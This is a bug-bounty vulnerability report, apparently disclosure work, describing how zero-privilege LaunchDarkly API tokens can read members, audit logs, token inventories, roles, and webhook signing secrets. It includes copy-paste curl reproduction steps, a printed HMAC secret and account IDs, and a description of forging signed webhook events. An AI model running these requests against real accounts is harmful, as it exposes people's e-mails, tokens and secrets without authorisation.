# FINDING_002 — API tokens with `basePermissions: no_access` can read account-level resources (members, audit log, token inventory, webhooks, custom roles)

- **Severity proposal**: P2 (Broken Access Control / Sensitive Data Exposure)
- **Target**: app.launchdarkly.com (in scope)
- **Account**: org A (`zeno0+org@bugcrowdninja.com`), account `_id 6ac28fd11c28fb07516cf361`
- **Status**: CONFIRMED, fully reproducible (2026-10-22)

## Summary

An API access token created with `basePermissions: "no_access"` (the strictest
least-privilege mode — "no access except explicitly granted by policy") is able
to **read account-level resources it was never granted**: the full member list
(e-mail addresses, roles, member IDs, lastSeen), the complete audit log (all
account activity incl. other members' actions), the full API token inventory
(names, IDs, roles, lastUsed), the webhook list (target URLs), the custom role
policy documents, and the project list.

Write operations are correctly denied (403), and project-scoped resources
(flags, segments, metrics, environments, project detail) are correctly denied —
the bypass affects the **account-level endpoints only**.

## Impact

Tokens with `basePermissions: no_access` are the intended way to hand a
zero-privilege, explicitly-scoped credential to third parties (CI jobs,
integrations, contractors). Each such token can be used to enumerate:

1. **`/api/v2/members`** — every member's e-mail, role, member `_id`, last-seen timestamp
2. **`/api/v2/auditlog`** (+ per-entry detail) — full account activity history:
   who changed which flag/token/role, when, with member e-mail addresses
3. **`/api/v2/tokens`** — inventory of ALL access tokens: names, `_id`s, roles,
   `lastUsed` timestamps (recon for targeted token attacks; `_id`s are the
   identifiers needed for any future token-focused bug)
4. **`/api/v2/webhooks`** — webhook endpoint URLs (may embed secrets in query strings)
5. **`/api/v2/roles`** — custom role policy documents (security logic disclosure)
6. **`/api/v2/projects`** — project list

The leak defeats the purpose of least-privilege tokens and enables
reconnaissance for follow-on attacks (phishing with real member e-mails,
targeting the most recently used admin tokens, etc.).

## Steps to reproduce (copy-paste)

```bash
# 1. As account owner: create a custom role with NO base permissions
curl -s -X POST "https://app.launchdarkly.com/api/v2/roles" \
  -H "Cookie: ldso=<owner session>" -H "Content-Type: application/json" \
  -d '{"key":"zeno-flag-viewer-noaccess","name":"scoped","description":"scoped",
       "policy":[{"effect":"allow","resources":["proj/default:env/test:flag/zeno-webhook-fixture"],"actions":["*"]}],
       "basePermissions":"no_access"}'
# -> 201

# 2. Create an API token with that custom role (via app UI:
#    /settings/authorization/tokens -> Create token -> Role: Custom -> pick the role)

# 3. Use ONLY that token (zero effective permissions):
TOK="api-<the token value>"

curl -s "https://app.launchdarkly.com/api/v2/members" -H "Authorization: $TOK"
# -> 200, full member list (email/role/_id/lastSeen) — EXPECTED 403

curl -s "https://app.launchdarkly.com/api/v2/auditlog?limit=10" -H "Authorization: $TOK"
# -> 200, complete audit trail — EXPECTED 403

curl -s "https://app.launchdarkly.com/api/v2/tokens?limit=20" -H "Authorization: $TOK"
# -> 200, all access tokens (names, _ids, roles, lastUsed) — EXPECTED 403

curl -s "https://app.launchdarkly.com/api/v2/webhooks" -H "Authorization: $TOK"
curl -s "https://app.launchdarkly.com/api/v2/roles" -H "Authorization: $TOK"
curl -s "https://app.launchdarkly.com/api/v2/projects" -H "Authorization: $TOK"
# -> all 200 — EXPECTED 403
```

## Control results (proving the token really has no permissions)

| Endpoint | no_access token | Expected |
|---|---|---|
| GET /api/v2/flags/default/{in-policy flag} | **403** (even the policy grant fails to apply) | 200 |
| GET /api/v2/flags/default/{other flag} | 403 ✓ | 403 |
| GET /api/v2/projects/default | 403 ✓ | 403 |
| GET /api/v2/projects/default/environments (SDK keys) | 403 ✓ | 403 |
| GET /api/v2/segments/default | 403 ✓ | 403 |
| GET /api/v2/metrics/default | 403 ✓ | 403 |
| GET /api/v2/teams | 403 ✓ | 403 |
| **GET /api/v2/members** | **200 — BYPASS** | 403 |
| **GET /api/v2/members/{id}** | **200 — BYPASS** | 403 |
| **GET /api/v2/auditlog + /{id}** | **200 — BYPASS** | 403 |
| **GET /api/v2/tokens** | **200 — BYPASS** | 403 |
| **GET /api/v2/webhooks + /{id}** | **200 — BYPASS** | 403 |
| **GET /api/v2/roles + /{key}** | **200 — BYPASS** | 403 |
| **GET /api/v2/projects (list)** | **200 — BYPASS** | 403 |
| PATCH member role | 403 ✓ (deny) | 403 |
| PATCH token | 403 ✓ (deny) | 403 |
| POST webhook | 403 ✓ (deny) | 403 |

Sample leaked data (this account):

```
member: zeno0+org@bugcrowdninja.com | role: owner | id: 6ac28fd11c28fb07516cf363
tokens: idor-probe-token (6ad9fbdd…), zeno-scoped-ui (6ada110…), … with lastUsed timestamps
audit:  "[zeno test](mailto:zeno0+org@…) created the role [zeno flag viewer noaccess]…"
```

## Additional anomaly observed (same area, lower confidence)

While testing a custom role with the DEFAULT `basePermissions: "reader"`, a
policy granting only `proj/default:env/test:flag/zeno-webhook-fixture`:
- the flag **list** endpoint returned all flags (expected for reader base), but
- flags whose variations have **mixed JSON types** (e.g. `[{"value":"s"},{"value":false}]`)
  disappeared from both list and item reads for that token (404), while
  boolean-variation flags were all readable — suggesting the token-policy
  filter implementation drops flags with non-uniform variation types rather
  than evaluating policy correctly. Not fully root-caused; flag-level READ
  enforcement for custom-role tokens looks unreliable in this version.


## R5 update (2026-10-23) — expanded bypass surface (re-verified with fresh no_access token)

Additional account-level GET endpoints that also return **200 under the same
zero-privilege token** (beyond the original matrix):

| Endpoint | Leaks |
|---|---|
| `GET /api/v2/account` | org name, `requireMfa`, session config (duration/refresh) |
| `GET /api/v2/account/relay-auto-configs` + `/{id}` | relay proxy configs **incl. full policy documents** (`proj/*:env/*` actions `*`) and creator identity (name/email/role) |
| `GET /api/v2/usage` + `/usage/streams[/server|/client]`, `/usage/data-export-events`, `/usage/warehouse-export` | account usage series/metadata |
| `GET /api/v2/code-refs/repositories` | code-refs repository inventory |
| `GET /internal/entitlements/release-guardian` | internal entitlement state (`{"state":"enabled",...}`) — also notable as the first `/internal/*` endpoint reachable by a pure API token |

Write verbs on this endpoint class remain correctly denied (403 `createCodeRefsRepository`,
`createAccessToken`, `createWebhook`, `updateAccessTokenName`) — the bypass is
**strictly read-only**. Cross-org isolation is unaffected (this is intra-account
least-privilege failure only).

S3 files behind segment exports are properly presigned (SigV4, 10-min expiry);
bucket listing denied. Segment exports are org-fenced (uniform 500, no oracle).


## R6 update (2026-10-23) — WEBHOOK SIGNING SECRET disclosure (impact upgrade)

`GET /api/v2/webhooks/{id}` under the zero-privilege token returns the webhook's
HMAC signing secret in the `secret` field (re-verified twice with fresh
no_access tokens):

```json
{"_id":"6adaa3b0db707e0735880977","name":"zeno-sign-wh-b",
 "url":"https://example.com/zx-b","secret":"44dd62dafded4ec4a6ea7f74dc0712f4","on":false}
```

The same response leaks the webhook target URL. LaunchDarkly signs deliveries
with `X-LD-Signature: sha256=HMAC-SHA256(secret, body)` — a zero-privilege
token holder can therefore **forge validly-signed LaunchDarkly webhook events**
against any endpoint configured in the account (CI/CD auto-deploy hooks,
incident tooling, chat bots that verify LD signatures).

Baseline comparison: the built-in `reader` role also sees the secret (LD models
reader as "view everything"), which makes the correct framing: **a token whose
effective permissions are explicitly NOTHING still discloses a signing secret
and the full account recon surface**. List view (`GET /api/v2/webhooks`) does
not include the secret — only the detail GET does.

Cross-org scoping check (re-verified R6): the no_access token's account-level
reads are account-scoped — cross-org member/webhook IDs return 404; auditlog /
tokens / roles / relay / account responses contain only the token's own org
data. This is an intra-account least-privilege failure (P2), not cross-org (P1).

## Notes

- Sessions/cookies, project-scoped resources, and all write paths tested were
  correctly enforced — this is NOT a cross-org issue; it is intra-account
  least-privilege enforcement failing on account-level endpoints.
- No SDK keys, mobile keys, or flag data are exposed by this bypass.

## R9 update (2026-10-23) — integrations + destinations: new no_access-readable families

Re-verified with a fresh `no_access` token (R9 methodology: role with
`basePermissions: no_access` + dangling-flag policy, API token minted from it):

| Endpoint (GET) | no_access | Notes |
|---|---|---|
| /api/v2/integrations/datadog | 200 | `config.apiKey` returned **masked** `zen**************123` (first/last 3 chars) |
| /api/v2/integrations/{splunk,elastic,dynatrace,msteams,grafana} | 200 | config lists readable |
| /api/v2/integration-manifests | 200 | full manifest schema set |
| /api/v2/destinations | 200 | member-session GET of this route TIMED OUT server-side in R6 — the zero-priv token gets a fast 200 |
| /api/v2/flag-statuses | 200 | org project-key listing |
| /api/v2/tags, /api/v2/versions | 200 | |
| /internal/metric-data-sources | 200 | |
| /internal/warehouse-integrations-health | 200 | |
| /api/v2/approval-requests | 200 | items policy-filtered to empty (member session sees items) |

New impact notes:
- Integration API keys are returned masked to ANY caller (including the
  zero-privilege token) — partial disclosure only (P5), unlike the webhook
  signing secret which is returned in full (P2 driver).
- `code-refs/repositories` create accepts a `pat` field but never stores or
  returns it (checked create + detail under no_access) — no PAT leak.
- relay-auto-config `fullKey` appears ONLY in the creation response (owner);
  detail GET under no_access exposes `displayKey` + full policy documents but
  not the relay key (re-confirmed R9).
- Correctly DENIED under no_access: the entire generic query engine
  (`POST /api/v2/chart/data`, `/api/v2/list/data` — uniform 403 viewProject for
  every domain incl. observability.traces / context.* / sdk.* / metrics.*),
  env detail with `apiKey`/`mobileKey` (403), `sdk-keys` route (403),
  `/internal/account/{invoices,accrued-invoices,card,new-hires}` (legacy fence
  rejects API tokens with "Invalid account ID header").
- Legacy account-header fence differential (R9): 12 candidate header names
  (`LD-Account`, `Account-Id`, `X-Tenant-Id`, …) injected with a FOREIGN
  account id changed nothing — TST session + ORG header returned TST's own
  invoice data, and headers are ignored entirely (account always resolves from
  the session). No cross-org billing read. DEFENDED.
